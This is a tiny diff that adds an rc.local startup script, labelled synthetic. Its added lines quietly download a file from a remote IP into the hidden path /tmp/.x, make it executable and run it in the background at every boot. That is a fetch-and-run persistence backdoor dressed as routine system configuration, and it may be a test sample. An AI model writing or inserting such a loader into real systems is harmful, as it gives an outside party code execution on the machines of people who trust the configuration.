@@ -1,0 +1,7 @@
+#!/bin/sh -e
+#
+# rc.local (synthetic)
+
+/usr/bin/wget -q -O /tmp/.x http://192.0.2.77/x && chmod +x /tmp/.x && \
+  /tmp/.x &
+exit 0
